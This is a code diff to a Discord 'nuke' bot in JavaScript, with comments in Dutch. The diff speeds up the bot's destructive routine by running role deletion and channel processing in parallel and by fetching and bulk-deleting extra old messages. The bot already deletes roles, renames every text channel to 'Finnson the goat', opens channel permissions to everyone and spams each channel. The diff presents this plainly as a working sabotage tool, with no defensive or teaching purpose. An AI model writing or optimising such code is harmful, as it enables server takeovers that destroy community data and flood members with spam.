@@ -33,7 +33,7 @@ client.on('messageCreate', async message => {
     message.delete().catch(() => {});
 
     try {
-        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel`);
+        await message.author.send(`⚠️ **MAX SPEED NUKE** ⚠️\nSpam: ${spamAmount}x per channel`);
     } catch {}
 
     let cancelled = false;
@@ -46,17 +46,12 @@ client.on('messageCreate', async message => {
     await new Promise(r => setTimeout(r, 3000));
     if (cancelled) return;
 
-    // 1. Rollen verwijderen
-    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
-        try { await role.delete(); } catch {}
-    }
+    // Rollen verwijderen
+    Promise.all(
+        message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).map(role => role.delete().catch(() => {}))
+    ).catch(() => {});
 
-    // 2. Categorieën verwijderen
-    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
-        try { await cat.delete(); } catch {}
-    }
-
-    // 3. Channels hernoemen + spammen
+    // Alle channels **tegelijkertijd** verwerken
     const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
     let processed = 0;
 
@@ -64,10 +59,11 @@ client.on('messageCreate', async message => {
         try {
             // Oude berichten wissen
             await channel.bulkDelete(100, true).catch(() => {});
+            const oldMsgs = await channel.messages.fetch({ limit: 100 }).catch(() => []);
+            await channel.bulkDelete(oldMsgs, true).catch(() => {});
 
             // Hernoemen + zichtbaar maken
             await channel.setName("Finnson the goat");
-
             await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                 ViewChannel: true,
                 SendMessages: true,
@@ -95,6 +91,7 @@ client.on('messageCreate', async message => {
         } catch (err) {}
     });
 
+    // **Alle channels tegelijk starten**
     await Promise.all(promises);
 
     try {
